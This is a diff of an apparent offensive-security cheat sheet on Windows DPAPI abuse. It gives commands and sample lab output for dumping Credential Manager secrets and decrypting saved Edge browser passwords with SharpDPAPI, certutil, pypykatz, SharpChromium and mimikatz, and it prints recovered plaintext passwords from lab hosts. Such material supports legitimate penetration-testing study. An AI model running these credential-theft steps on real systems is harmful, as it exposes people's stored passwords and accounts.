+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    LastWritten      : 5/9/2023 4:03:21 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetName       : Domain:interactive=OFFICE\HHogan
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetAlias      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    Comment          : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    UserName         : OFFICE\HHogan
+</span></span></span><span class="line"><span class="cl"><span class="go">    Credential       : H4ppyFtW183#
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredFile           : E76CCA3670CD9BB98DF79E0A8D176F1E
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    guidMasterKey    : {10811601-0fa9-43c2-97e5-9bef8471fc7d}
+</span></span></span><span class="line"><span class="cl"><span class="go">    size             : 374
+</span></span></span><span class="line"><span class="cl"><span class="go">    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+</span></span></span><span class="line"><span class="cl"><span class="go">    description      : Enterprise Credential Data
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    LastWritten      : 1/18/2024 11:53:30 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetName       : Domain:interactive=office\hhogan
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetAlias      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    Comment          : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    UserName         : office\hhogan
+</span></span></span><span class="line"><span class="cl"><span class="go">    Credential       : 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SharpDPAPI completed in 00:00:00.1707869
 </span></span></span></code></pre></div></div></p>
 <hr>
 <h3 id="abuse-2-browser-saved-creds">Abuse #2: Browser Saved Creds</h3>
 <p>
-<button data-tabset="set3" data-tabcontent="tab1" class="active">Manual</button>
+<button data-tabset="set3" data-tabcontent="tab1" class="active">Offline</button>
 
 <button data-tabset="set3" data-tabcontent="tab2" >Auto</button>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-prepare-logindata-and-localstate-file">1. Prepare logindata and localstate file</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get Local State json file, copy and paste to <span class="nb">local</span> Linux
 </span></span><span class="line"><span class="cl"><span class="go">type &#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Local State&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; type &#34;C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data\Local State&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">{&#34;abusive_adblocker_etag&#34;:&#34;\&#34;1651629182\&#34;&#34;,...[SNIP]...,&#34;web_widget&#34;:{&#34;disabled_due_extensions&#34;:false}}
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get Login Data binary file
 </span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Default\Login Data&#34; C:\ProgramData\logindata
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; certutil -encode &#34;C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data\Default\Login Data&#34; C:\ProgramData\logindata
+</span></span></span><span class="line"><span class="cl"><span class="go">Input Length = 55296
+</span></span></span><span class="line"><span class="cl"><span class="go">Output Length = 76088
+</span></span></span><span class="line"><span class="cl"><span class="go">CertUtil: -encode command completed successfully.
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux <span class="o">(</span>Exclude BEGIN and END CERTIFIATE<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\logindata
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; type C:\ProgramData\logindata
+</span></span></span><span class="line"><span class="cl"><span class="go">-----BEGIN CERTIFICATE-----
+</span></span></span><span class="line"><span class="cl"><span class="go">U1FMaXRlIGZvcm1hdCAzAAgAAQEAQCAgAAAAAgAAABsAAAAAAAAAAAAAABAAAAAE
+</span></span></span><span class="line"><span class="cl"><span class="go">AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span></span><span class="line"><span class="cl"><span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span></span><span class="line"><span class="cl"><span class="go">-----END CERTIFICATE-----
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
 </span></span><span class="line"><span class="cl"><span class="go">cat logindata_b64 | base64 -d &gt; logindata
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Extract key from <span class="nb">local</span> state
-</span></span><span class="line"><span class="cl"><span class="go">cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- &gt; blob
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get masterkey_guid
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat logindata_b64 <span class="p">|</span> base64 -d &gt; logindata
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Extract key from <span class="nb">local</span> state
+</span></span><span class="line"><span class="cl"><span class="go">cat localstate.json | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- &gt; blob
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat localstate.json <span class="p">|</span> jq -r .os_crypt.encrypted_key <span class="p">|</span> base64 -d <span class="p">|</span> cut -c6- &gt; blob
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get masterkey_guid
 </span></span><span class="line"><span class="cl"><span class="go">pypykatz dpapi describe blob blob
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi describe blob blob
+</span></span><span class="line"><span class="cl"><span class="go">== DPAPI_BLOB ==
+</span></span></span><span class="line"><span class="cl"><span class="go">version: 1 
+</span></span></span><span class="line"><span class="cl"><span class="go">credential_guid: b&#39;\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb&#39; 
+</span></span></span><span class="line"><span class="cl"><span class="go">masterkey_version: 1 
+</span></span></span><span class="line"><span class="cl"><span class="go">masterkey_guid: a8bd1009-f2ac-43ca-9266-8e029f503e11 
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/skelsec/pypykatz">pypykatz</a></em></small></p>
 <h4 id="2-retrieve-keys">2. Retrieve Keys</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get master key
 </span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt;&#34; C:\ProgramData\&lt;MASTERKEY_GUID&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; certutil -encode &#34;C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761\a8bd1009-f2ac-43ca-9266-8e029f503e11 &#34; C:\ProgramData\a8bd1009-f2ac-43ca-9266-8e029f503e11
+</span></span></span><span class="line"><span class="cl"><span class="go">Input Length = 740
+</span></span></span><span class="line"><span class="cl"><span class="go">Output Length = 1076
+</span></span></span><span class="line"><span class="cl"><span class="go">CertUtil: -encode command completed successfully.
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
 </span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\&lt;MASTERKEY_GUID&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Bob.Wood\Documents&gt; type C:\ProgramData\a8bd1009-f2ac-43ca-9266-8e029f503e11
+</span></span></span><span class="line"><span class="cl"><span class="go">-----BEGIN CERTIFICATE-----
+</span></span></span><span class="line"><span class="cl"><span class="go">AgAAAAAAAAAAAAAAYQA4AGIAZAAxADAAMAA5AC0AZgAyAGEAYwAtADQAMwBjAGEA
+</span></span></span><span class="line"><span class="cl"><span class="go">LQA5ADIANgA2AC0AOABlADAAMgA5AGYANQAwADMAZQAxADEAAAAAAAAAAAAAAAAA
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">Lfcxq7UBteEZCQAtS7mfZjvwI0i15/4rq8bYRxtwgc4PHUWN+jWNqjWLubp5NiV8
+</span></span></span><span class="line"><span class="cl"><span class="go">4TpmPxZFTXNgcAL1Yueop4Y1qcl/l+CeAGfwc3viVD2hESIAK6Zm3OFAByjsyxUh
+</span></span></span><span class="line"><span class="cl"><span class="go">29h5Ie/21Ms2D8kNzPms0rzLbXA=
+</span></span></span><span class="line"><span class="cl"><span class="go">-----END CERTIFICATE-----
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
 </span></span><span class="line"><span class="cl"><span class="go">cat masterkey_guid_b64 | base64 -d &gt; masterkey_guid
-</span></span></span></code></pre></div><h4 id="3-decrypt">3. Decrypt</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi prekey password &lt;SID&gt; &lt;USER_PASSWORD&gt; | tee pkf
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi masterkey &lt;MASTERKEY_GUID_FILE&gt; pkf -o mkf
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi chrome --logindata logindata mkf localstate
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat masterkey_guid_b64 <span class="p">|</span> base64 -d &gt; masterkey_guid
+</span></span></code></pre></div><h4 id="3-decrypt">3. Decrypt</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi prekey password &lt;SID&gt; &#39;&lt;PASSWORD&gt;&#39; | tee pkf
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi prekey password S-1-5-21-1844305427-4058123335-2739572863-2761 <span class="s1">&#39;!@p%i&amp;J#iNNo1T2&#39;</span> <span class="p">|</span> tee pkf
+</span></span><span class="line"><span class="cl"><span class="go">4ea57b2e9e19cb91226b1ce0f64e4edad3d56c82
+</span></span></span><span class="line"><span class="cl"><span class="go">0fcd9d392606c1dbf84c875dcfad678ca56cb607
+</span></span></span><span class="line"><span class="cl"><span class="go">202e6812a189277e0ccd0bc72dcfdd4ed6e9469e
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi masterkey masterkey_guid pkf -o mkf
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi masterkey masterkey_guid pkf -o mkf
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi chrome --logindata logindata mkf localstate.json
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi chrome --logindata logindata mkf localstate.json
+</span></span><span class="line"><span class="cl"><span class="go">file: logindata user: bob.wood@windcorp.htb pass: b&#39;SemTro\xc2\xa432756Gff&#39; url: http://somewhere.com/action_page.php
+</span></span></span><span class="line"><span class="cl"><span class="go">file: logindata user: bob.wood@windcorp.htb pass: b&#39;SomeSecurePasswordIGuess!09&#39; url: http://google.com/action_page.php
+</span></span></span><span class="line"><span class="cl"><span class="go">file: logindata user: bob.woodADM@windcorp.com pass: b&#39;smeT-Worg-wer-m024&#39; url: http://webmail.windcorp.com/action_page.php
 </span></span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpChromium.exe logins
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\windows\debug\wia&gt; .\SharpChromium.exe logins
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Beginning Edge extraction.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">--- Chromium Credential (User: Bob.Wood) ---
+</span></span></span><span class="line"><span class="cl"><span class="go">URL      : http://somewhere.com/action_page.php
+</span></span></span><span class="line"><span class="cl"><span class="go">Username : bob.wood@windcorp.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">Password : SemTro32756Gff
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">--- Chromium Credential (User: Bob.Wood) ---
+</span></span></span><span class="line"><span class="cl"><span class="go">URL      : http://google.com/action_page.php
+</span></span></span><span class="line"><span class="cl"><span class="go">Username : bob.wood@windcorp.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">Password : SomeSecurePasswordIGuess!09
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">--- Chromium Credential (User: Bob.Wood) ---
+</span></span></span><span class="line"><span class="cl"><span class="go">URL      : http://webmail.windcorp.com/action_page.php
+</span></span></span><span class="line"><span class="cl"><span class="go">Username : bob.woodADM@windcorp.com
+</span></span></span><span class="line"><span class="cl"><span class="go">Password : smeT-Worg-wer-m024
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Finished Edge extraction.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Done.
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe">SharpChromium.exe</a></em></small></p></div></p>
-<hr>
-<h3 id="abuse-3-decrpyt-masterkey-without-password">Abuse #3: Decrpyt Masterkey without password</h3>
-<p>
-<button data-tabset="set4" data-tabcontent="tab1" class="active">Windows</button>
-
-<div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Take note of the last key
-</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;dpapi::masterkey /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /rpc&#34; exit
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Decrypt
-</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;dpapi::cred /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /masterkey:&lt;KEY&gt;&#34; exit
-</span></span></span></code></pre></div></div></p>
 
 </div></div>
     
